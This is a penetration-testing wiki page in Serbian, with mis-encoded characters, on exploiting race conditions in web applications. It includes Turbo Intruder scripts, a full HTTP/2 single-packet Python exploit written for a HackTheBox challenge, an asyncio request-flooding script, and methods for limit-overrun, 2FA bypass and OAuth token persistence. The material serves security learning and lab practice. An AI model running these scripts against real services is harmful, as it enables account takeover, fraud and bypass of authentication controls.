# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

{% hint style="warning" %}
Za sticanje dubokog razumevanja ove tehnike proverite izvorni izveÅ¡taj na [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## UnapreÄ‘enje napada na Race Condition

Glavna prepreka u iskoriÅ¡Ä‡avanju race condition-a je osiguranje da se viÅ¡e zahteva obraÄ‘uje u isto vreme, sa **vrlo malom razlikom u vremenima obradeâ€”idealno, manje od 1ms**.

Ovde moÅ¾ete pronaÄ‡i neke tehnike za sinhronizaciju zahteva:

#### HTTP/2 napad sa jednim paketom vs. HTTP/1.1 sinhronizacija poslednjeg bajta

* **HTTP/2**: PodrÅ¾ava slanje dva zahteva preko jedne TCP veze, smanjujuÄ‡i uticaj mreÅ¾nog jitter-a. MeÄ‘utim, zbog varijacija na strani servera, dva zahteva moÅ¾da neÄ‡e biti dovoljna za dosledno iskoriÅ¡Ä‡avanje race condition-a.
* **HTTP/1.1 'Sinhronizacija poslednjeg bajta'**: OmoguÄ‡ava prethodno slanje veÄ‡ine delova 20-30 zahteva, zadrÅ¾avajuÄ‡i mali fragment, koji se zatim Å¡alje zajedno, postizajuÄ‡i simultano stizanje na server.

**Priprema za sinhronizaciju poslednjeg bajta** ukljuÄuje:

1. Slanje zaglavlja i podataka tela minus poslednji bajt bez zavrÅ¡avanja toka.
2. Pauza od 100ms nakon inicijalnog slanja.
3. OnemoguÄ‡avanje TCP\_NODELAY kako bi se iskoristio Nagle-ov algoritam za grupisanje finalnih okvira.
4. Pingovanje za zagrevanje veze.

SledeÄ‡e slanje zadrÅ¾anih okvira trebalo bi da rezultira njihovim stizanjem u jednom paketu, Å¡to se moÅ¾e proveriti putem Wireshark-a. Ova metoda se ne primenjuje na statiÄne datoteke, koje obiÄno nisu ukljuÄene u RC napade.

### PrilagoÄ‘avanje arhitekturi servera

Razumevanje arhitekture cilja je kljuÄno. Front-end serveri mogu drugaÄije usmeravati zahteve, Å¡to utiÄe na vreme. Preventivno zagrevanje veze na strani servera, kroz beznaÄajne zahteve, moÅ¾e normalizovati vreme zahteva.

#### Rukovanje zakljuÄavanjem zasnovanim na sesiji

Okviri poput PHP-ovog upravljaÄa sesijama serijalizuju zahteve po sesiji, potencijalno prikrivajuÄ‡i ranjivosti. KoriÅ¡Ä‡enje razliÄitih tokena sesije za svaki zahtev moÅ¾e zaobiÄ‡i ovaj problem.

#### PrevazilaÅ¾enje ograniÄenja brzine ili resursa

Ako zagrevanje veze nije efikasno, namerno izazivanje kaÅ¡njenja u ograniÄenju brzine ili resursa web servera putem poplave laÅ¾nih zahteva moÅ¾e olakÅ¡ati napad sa jednim paketom izazivajuÄ‡i kaÅ¡njenje na strani servera pogodno za race condition.

## Primeri napada

* **Tubo Intruder - HTTP2 napad sa jednim paketom (1 krajnja taÄka)**: MoÅ¾ete poslati zahtev na **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), moÅ¾ete promeniti u zahtevu vrednost koju Å¾elite da brute force-ujete za **`%s`** kao u `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` i zatim odabrati **`examples/race-single-packer-attack.py`** iz padajuÄ‡eg menija:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Ako planirate da **poÅ¡aljete razliÄite vrednosti**, moÅ¾ete modifikovati kod sa ovim koji koristi reÄnik iz clipboard-a:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Ako web ne podrÅ¾ava HTTP2 (samo HTTP1.1) koristite `Engine.THREADED` ili `Engine.BURP` umesto `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - HTTP2 napad sa jednim paketom (ViÅ¡e krajnjih taÄaka)**: U sluÄaju da treba da poÅ¡aljete zahtev ka 1 krajnjoj taÄki, a zatim viÅ¡e ka drugim krajnjim taÄkama da aktivirate RCE, moÅ¾ete promeniti `race-single-packet-attack.py` skriptu sa neÄim poput:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* TakoÄ‘e je dostupno u **Repeater** putem nove opcije '**Send group in parallel**' u Burp Suite.
* Za **limit-overrun** moÅ¾ete jednostavno dodati **istu zahtev 50 puta** u grupu.
* Za **connection warming**, moÅ¾ete **dodati** na **poÄetku** **grupe** neke **zahteve** ka nekoj nestatiÄnoj delu web servera.
* Za **delaying** procesa **izmeÄ‘u** obrade **jednog zahteva i drugog** u 2 podstanja, moÅ¾ete **dodati dodatne zahteve izmeÄ‘u** oba zahteva.
* Za **multi-endpoint** RC moÅ¾ete poÄeti slati **zahtev** koji **ide u skriveno stanje** i zatim **50 zahteva** odmah nakon njega koji **iskoriÅ¡Ä‡ava skriveno stanje**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Automatizovani python skript**: Cilj ovog skripta je da promeni email korisnika dok neprekidno verifikuje dok verifikacioni token novog emaila ne stigne na poslednji email (to je zato Å¡to je u kodu viÄ‘ena RC gde je bilo moguÄ‡e modifikovati email, ali poslati verifikaciju na stari jer je varijabla koja oznaÄava email veÄ‡ bila popunjena prvim).\
Kada se reÄ "objetivo" pronaÄ‘e u primljenim emailovima, znamo da smo primili verifikacioni token promenjenog emaila i zavrÅ¡avamo napad.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### PoboljÅ¡anje napada sa jednim paketom

U originalnom istraÅ¾ivanju objaÅ¡njeno je da ovaj napad ima limit od 1.500 bajtova. MeÄ‘utim, u [**ovom postu**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), objaÅ¡njeno je kako je moguÄ‡e proÅ¡iriti ograniÄenje od 1.500 bajtova napada sa jednim paketom na **65.535 B ograniÄenje prozora TCP-a koriÅ¡Ä‡enjem fragmentacije na IP nivou** (deljenje jednog paketa na viÅ¡e IP paketa) i slanje u razliÄitom redosledu, Å¡to je omoguÄ‡ilo spreÄavanje ponovnog sastavljanja paketa dok svi fragmenti ne stignu do servera. Ova tehnika je omoguÄ‡ila istraÅ¾ivaÄu da poÅ¡alje 10.000 zahteva za otprilike 166ms.&#x20;

Imajte na umu da, iako ovo poboljÅ¡anje Äini napad pouzdanijim u RC-u koji zahteva stotine/hiljade paketa da stignu u isto vreme, moÅ¾e imati i neka softverska ograniÄenja. Neki popularni HTTP serveri kao Å¡to su Apache, Nginx i Go imaju strogo podeÅ¡avanje `SETTINGS_MAX_CONCURRENT_STREAMS` na 100, 128 i 250. MeÄ‘utim, drugi kao Å¡to su NodeJS i nghttp2 nemaju ograniÄenje.\
To u suÅ¡tini znaÄi da Ä‡e Apache uzeti u obzir samo 100 HTTP konekcija iz jedne TCP konekcije (ograniÄavajuÄ‡i ovaj RC napad).

MoÅ¾ete pronaÄ‡i neke primere koriÅ¡Ä‡enja ove tehnike u repozitorijumu [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Pre prethodnog istraÅ¾ivanja, ovo su bili neki payload-ovi koji su koriÅ¡Ä‡eni i koji su samo pokuÅ¡avali da poÅ¡alju pakete Å¡to je brÅ¾e moguÄ‡e kako bi izazvali RC.

* **Repeater:** Proverite primere iz prethodne sekcije.
* **Intruder**: PoÅ¡aljite **zahtev** na **Intruder**, postavite **broj niti** na **30** unutar **menija Opcije**, i izaberite kao payload **Null payloads** i generiÅ¡ite **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodologija**

### Limit-overrun / TOCTOU

Ovo je najosnovnija vrsta race condition gde **ranjivosti** koje se **pojavljuju** na mestima koja **ograniÄavaju broj puta na koji moÅ¾ete izvrÅ¡iti neku radnju**. Kao koriÅ¡Ä‡enje istog koda za popust u veb prodavnici viÅ¡e puta. Veoma lak primer moÅ¾e se naÄ‡i u [**ovom izveÅ¡taju**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ili u [**ovoj greÅ¡ci**](https://hackerone.com/reports/759247)**.**

Postoji mnogo varijacija ove vrste napada, ukljuÄujuÄ‡i:

* Otkup poklon kartice viÅ¡e puta
* Ocenjivanje proizvoda viÅ¡e puta
* Podizanje ili prebacivanje gotovine u iznosu veÄ‡em od stanja na raÄunu
* Ponovno koriÅ¡Ä‡enje jednog CAPTCHA reÅ¡enja
* ZaobilaÅ¾enje anti-brute-force ograniÄenja brzine

### **Skriveni podstanja**

Eksploatacija sloÅ¾enih race condition Äesto ukljuÄuje koriÅ¡Ä‡enje kratkih prilika za interakciju sa skrivenim ili **nepredviÄ‘enim maÅ¡inskim podstanjem**. Evo kako pristupiti ovome:

1. **Identifikujte potencijalna skrivena podstanja**
* PoÄnite tako Å¡to Ä‡ete odrediti krajnje taÄke koje modifikuju ili interaguju sa kritiÄnim podacima, kao Å¡to su korisniÄki profili ili procesi resetovanja lozinke. Fokusirajte se na:
* **SkladiÅ¡tenje**: Preferirajte krajnje taÄke koje manipuliÅ¡u podacima koji su trajni na serveru u odnosu na one koje obraÄ‘uju podatke na klijentskoj strani.
* **Akcija**: TraÅ¾ite operacije koje menjaju postojeÄ‡e podatke, koje su verovatnije da Ä‡e stvoriti uslove za eksploataciju u poreÄ‘enju sa onima koje dodaju nove podatke.
* **KljuÄ**: UspeÅ¡ni napadi obiÄno ukljuÄuju operacije koje su kljuÄne na istom identifikatoru, npr. korisniÄko ime ili token za resetovanje.
2. **Sprovedite inicijalno ispitivanje**
* Testirajte identifikovane krajnje taÄke sa napadima race condition, posmatrajuÄ‡i bilo kakve odstupanja od oÄekivanih rezultata. NeoÄekivani odgovori ili promene u ponaÅ¡anju aplikacije mogu signalizirati ranjivost.
3. **Demonstrirajte ranjivost**
* SuÅ¾avajte napad na minimalan broj zahteva potrebnih za eksploataciju ranjivosti, Äesto samo dva. Ovaj korak moÅ¾e zahtevati viÅ¡e pokuÅ¡aja ili automatizaciju zbog preciznog tajminga koji je ukljuÄen.

### Napadi osetljivi na vreme

Preciznost u tajmingu zahteva moÅ¾e otkriti ranjivosti, posebno kada se koriste predvidljive metode poput vremenskih oznaka za sigurnosne tokene. Na primer, generisanje tokena za resetovanje lozinke na osnovu vremenskih oznaka moglo bi omoguÄ‡iti identiÄne tokene za simultane zahteve.

**Za eksploataciju:**

* Koristite precizan tajming, poput napada jednim paketom, da izvrÅ¡ite simultane zahteve za resetovanje lozinke. IdentiÄni tokeni ukazuju na ranjivost.

**Primer:**

* ZatraÅ¾ite dva tokena za resetovanje lozinke u isto vreme i uporedite ih. Podudaranje tokena sugeriÅ¡e greÅ¡ku u generisanju tokena.

**Proverite ovo** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **da probate ovo.**

## Studije sluÄaja skrivenih podstanja

### PlaÄ‡anje i dodavanje stavke

Proverite ovo [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) da vidite kako da **platite** u prodavnici i **dodate dodatnu** stavku za koju **neÄ‡ete morati da platite**.

### Potvrda drugih emailova

Ideja je da **verifikujete email adresu i promenite je na drugu u isto vreme** da biste saznali da li platforma verifikuje novu promenjenu.

### Promena emaila na 2 email adrese zasnovane na kolaÄiÄ‡ima

Prema [**ovoj studiji**](https://portswigger.net/research/smashing-the-state-machine) Gitlab je bio ranjiv na preuzimanje na ovaj naÄin jer moÅ¾e **poslati** **token za verifikaciju emaila jedne email adrese na drugu email adresu**.

**Proverite ovo** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **da probate ovo.**

### ZaobilaÅ¾enje potvrde baze podataka / ZaobilaÅ¾enje potvrde

Ako se koriste **2 razliÄita pisanja** za **dodavanje** **informacija** unutar **baze podataka**, postoji mali deo vremena kada je **samo prvi podatak napisan** unutar baze podataka. Na primer, kada se kreira korisnik, **korisniÄko ime** i **lozinka** mogu biti **napisani** i **onda se piÅ¡e token** za potvrdu novokreiranog naloga. To znaÄi da za kratak period **token za potvrdu naloga je null**.

Stoga **registracija naloga i slanje nekoliko zahteva sa praznim tokenom** (`token=` ili `token[]=` ili bilo koja druga varijacija) za trenutnu potvrdu naloga mogla bi omoguÄ‡iti **potvrdu naloga** gde ne kontroliÅ¡ete email.

**Proverite ovo** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **da probate ovo.**

### ZaobilaÅ¾enje 2FA

SledeÄ‡i pseudo-kod je ranjiv na race condition jer u veoma kratkom vremenu **2FA nije primenjen** dok se sesija kreira:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 veÄna postojanost

Postoji nekoliko [**OAUth provajdera**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Ove usluge Ä‡e vam omoguÄ‡iti da kreirate aplikaciju i autentifikujete korisnike koje je provajder registrovao. Da biste to uradili, **klijent** Ä‡e morati da **dozvoli vaÅ¡oj aplikaciji** pristup nekim od njihovih podataka unutar **OAUth provajdera**.\
Dakle, do sada je to samo uobiÄajeni prijavljivanje sa google/linkedin/github... gde se pojavljuje stranica koja kaÅ¾e: "_Aplikacija \<InsertCoolName> Å¾eli da pristupi vaÅ¡im informacijama, da li Å¾elite da to dozvolite?_"

#### Race Condition u `authorization_code`

**Problem** se pojavljuje kada **prihvatite** i automatski Å¡alje **`authorization_code`** zloÄ‡udnoj aplikaciji. Tada, ova **aplikacija zloupotrebljava Race Condition u OAUth servisu da generiÅ¡e viÅ¡e od jednog AT/RT** (_Authentication Token/Refresh Token_) iz **`authorization_code`** za vaÅ¡ nalog. U suÅ¡tini, zloupotrebiÄ‡e Äinjenicu da ste prihvatili aplikaciju da pristupi vaÅ¡im podacima da **kreira nekoliko naloga**. Tada, ako **prestaneÅ¡ da dozvoljavaÅ¡ aplikaciji da pristupi tvojim podacima, jedan par AT/RT Ä‡e biti obrisan, ali ostali Ä‡e i dalje biti vaÅ¾eÄ‡i**.

#### Race Condition u `Refresh Token`

Kada ste **dobili vaÅ¾eÄ‡i RT**, mogli biste pokuÅ¡ati da **zloupotrebite to da generiÅ¡ete nekoliko AT/RT** i **Äak i ako korisnik otkaÅ¾e dozvole** za zloÄ‡udnu aplikaciju da pristupi njegovim podacima, **several RTs Ä‡e i dalje biti vaÅ¾eÄ‡i.**

## **RC u WebSockets**

U [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) moÅ¾ete pronaÄ‡i PoC u Javi za slanje websocket poruka u **paraleli** da zloupotrebi **Race Conditions takoÄ‘e u Web Sockets**.

## Reference

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
* [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
